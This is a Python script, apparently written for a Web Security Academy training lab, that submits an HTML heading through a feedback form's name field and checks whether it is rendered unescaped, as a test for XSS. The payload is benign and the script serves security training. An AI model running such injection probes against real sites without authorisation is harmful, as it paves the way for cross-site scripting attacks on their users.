#!/usr/bin/env python3
import requests
from bs4 import BeautifulSoup

BASE_URL = "https://0a3900c304b67111838b512800a90077.web-security-academy.net"

session = requests.Session()

# Get the feedback page
print("[*] Getting feedback page...")
response = session.get(f"{BASE_URL}/feedback")
soup = BeautifulSoup(response.text, 'html.parser')

# Find the form
form = soup.find('form')
if form:
    print(f"[*] Form found with action: {form.get('action')}")
    
    # Get CSRF token
    csrf = soup.find('input', {'name': 'csrf'})
    csrf_token = csrf.get('value') if csrf else None
    print(f"[*] CSRF token: {csrf_token}")

# Submit with h1 tag
payload = '<h1>TEST HEADING</h1>'
form_data = {
    'name': payload,
    'email': 'test@test.com',
    'subject': 'Test',
    'message': 'Test message'
}

if csrf_token:
    form_data['csrf'] = csrf_token

print(f"\\n[*] Submitting payload: {payload}")
submit_response = session.post(
    f"{BASE_URL}/feedback/submit",
    data=form_data,
    headers={
        'Content-Type': 'application/x-www-form-urlencoded',
        'Referer': f"{BASE_URL}/feedback"
    }
)

print(f"[*] Submit response status: {submit_response.status_code}")
print(f"[*] Response URL: {submit_response.url}")

# Save the response
with open('feedback_response.html', 'w') as f:
    f.write(submit_response.text)
print("[*] Response saved to feedback_response.html")

# Check if payload appears in response
if payload in submit_response.text:
    print("[✓] Payload found in response (exact match)!")
elif 'TEST HEADING' in submit_response.text:
    print("[✓] Text 'TEST HEADING' found in response!")
    
    # Find where it appears
    soup = BeautifulSoup(submit_response.text, 'html.parser')
    h1_tags = soup.find_all('h1')
    for h1 in h1_tags:
        if 'TEST HEADING' in h1.text:
            print(f"[✓] Found as actual H1 tag: {h1}")
            print("[🎯] XSS CONFIRMED - HTML injection works!")
else:
    print("[✗] Payload not found in response")
    
    # Check if it's at the bottom of the page
    lines = submit_response.text.split('\\n')
    for i, line in enumerate(lines[-20:]):  # Check last 20 lines
        if 'name' in line.lower() or 'test' in line.lower():
            print(f"[*] Line {len(lines)-20+i}: {line[:100]}")

# Now let's check if it persists on the feedback page
print("\\n[*] Checking if feedback persists on /feedback page...")
feedback_page = session.get(f"{BASE_URL}/feedback")
if 'TEST HEADING' in feedback_page.text:
    print("[✓] Feedback is displayed on /feedback page!")
    
    # Find where it appears
    soup = BeautifulSoup(feedback_page.text, 'html.parser')
    h1_tags = soup.find_all('h1')
    for h1 in h1_tags:
        if 'TEST HEADING' in h1.text:
            print(f"[✓] Found as H1 tag on feedback page: {h1}")